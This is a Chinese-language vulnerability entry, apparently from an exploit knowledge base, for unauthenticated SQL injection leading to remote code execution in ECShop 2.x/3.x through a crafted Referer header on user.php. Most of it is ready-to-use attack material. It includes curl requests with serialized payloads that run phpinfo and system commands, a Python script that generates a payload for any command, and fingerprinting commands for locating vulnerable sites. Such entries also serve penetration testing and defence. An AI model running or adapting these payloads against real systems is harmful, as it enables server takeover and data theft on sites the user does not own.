---
id: ECSHOP-SQLi-RCE
title: ECShop 2.x/3.x SQL注入导致任意代码执行漏洞
product: ecshop
vendor: ECShop
version_affected: "ECShop 2.x (全版本), ECShop 3.x (< 3.6.0)"
severity: CRITICAL
tags: [rce, sqli, code_injection, 无需认证, 国产]
fingerprint: ["ECShop", "ecshop", "Powered by ECShop"]
---

## 漏洞描述

ECShop 2.x/3.x 的 `user.php` 在处理 HTTP Referer 头时存在 SQL 注入漏洞。攻击者可通过构造恶意序列化数据注入 SQL 语句，利用 Smarty 模板引擎的 `insert` 标签动态执行 PHP 代码，最终实现远程代码执行。

## 影响版本

- ECShop 2.x 全版本（至 2.7.3）
- ECShop 3.x < 3.6.0

## 前置条件

- 无需认证
- ECShop 默认安装

## 利用步骤

1. 生成包含恶意 SQL 的序列化 Payload
2. 将 Payload 放入 HTTP Referer 头
3. 请求 `/user.php?act=login`
4. SQL 注入触发 Smarty 模板代码执行

## Payload

### ECShop 2.x — 执行 phpinfo

```bash
curl -s "http://target/user.php?act=login" \
  -H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1'\'' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'
```

### ECShop 2.x — 执行系统命令

```bash
# 生成 payload: {$asd'];system('id');//}xxx
# hex: 7b24617364275d3b73797374656d2827696427293b2f2f7d787878
curl -s "http://target/user.php?act=login" \
  -H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:103:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b73797374656d2827696427293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1'\'' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'
```

### ECShop 3.x — 使用 2.x 的 hash

ECShop 3.x 的 hash 为 `45ea207d7a2b68c49582d2d22adf953a`，但实测 2.x 的 hash 也可在 3.x 上使用。

### Payload 生成脚本

```python
import binascii

def gen_payload(cmd, version='2'):
    shell = binascii.hexlify("{$asd'];system('%s');//}xxx" % cmd).decode()
    id_val = "-1' UNION/*"
    num = "*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -" % (
        binascii.hexlify(id_val.encode()).decode(), shell)
    payload = 'a:2:{s:3:"num";s:%d:"%s";s:2:"id";s:%d:"%s";}' % (
        len(num), num, len(id_val), id_val)
    hash2 = '554fcae493e564ee0dc75bdf2ebf94ca'
    hash3 = '45ea207d7a2b68c49582d2d22adf953a'
    h = hash2 if version == '2' else hash3
    return "%sads|%s%s" % (h, payload, h)

print(gen_payload("id"))
```

## 验证方法

```bash
curl -s "http://target/user.php?act=login" \
  -H 'Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1'\'' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca' | grep "phpinfo"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "ECShop\|Powered by ECShop"
```

## 参考链接

- https://paper.seebug.org/691/
